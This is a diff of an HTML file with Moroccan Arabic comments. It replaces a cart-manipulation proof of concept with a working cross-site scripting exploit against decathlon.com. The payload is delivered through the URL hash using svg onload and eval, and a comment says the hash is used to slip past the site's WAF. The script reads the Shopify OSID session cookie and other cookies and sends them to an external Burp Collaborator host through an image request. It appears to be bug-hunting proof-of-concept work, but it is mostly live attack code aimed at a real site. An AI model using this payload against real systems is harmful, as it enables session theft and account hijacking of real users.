@@ -1,14 +1,34 @@
-<script>
-    // هاد الكود كيحاول يغير شي حاجة فـ الحساب ديال الضحية (مثلا كيزيد منتج للكارت)
-    let payload = `
-        fetch('/cart/add.js', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({items: [{id: 12345678, quantity: 1}]}) // كود منتج عشوائي
-        }).then(() => alert('Successfully manipulated user cart! Account Hijack Proof.'));
-    `;
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // الكود اللي غيضرب الـ Shopify OSID
+        let payload = `
+            (function(){
+                // 1. قراءة الـ OSID والـ Cookies
+                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "NOT_LOGGED_IN";
+                var cookies = document.cookie;
+                
+                // 2. الرابط الجديد ديال Burp اللي عطيتيني
+                var brupUrl = "https://h1jzz5qqpgp77mowxc3vgel7fylp9nxc.oastify.com/?osid=" + osid;
 
-    let encoded = encodeURIComponent(payload);
-    // ديما كنخدمو بـ الـ Hash # حيت هو الساروت ديالك
-    window.location.href = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
-</script>
+                // 3. إظهار الداتا فـ الصفحة (Internal Proof)
+                document.body.innerHTML = "<div style='background:red;color:white;padding:50px;font-size:25px;position:fixed;top:0;width:100%;z-index:9999;text-align:center;word-break:break-all;'>" +
+                                          "<h1>VULNERABILITY CONFIRMED!</h1>" +
+                                          "<b>OSID:</b> " + osid + "</div>";
+
+                // 4. محاولة تهريب الداتا لـ Burp (External Proof)
+                var img = new Image();
+                img.src = brupUrl + "&full=" + btoa(cookies).substring(0,100);
+            })();
+        `;
+
+        let encoded = encodeURIComponent(payload);
+        
+        // استغلال الـ Hash (#) اللي ديما كيسلكنا من الـ WAF
+        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+
+        window.location.href = finalTarget;
+    </script>
+</body>
+</html>
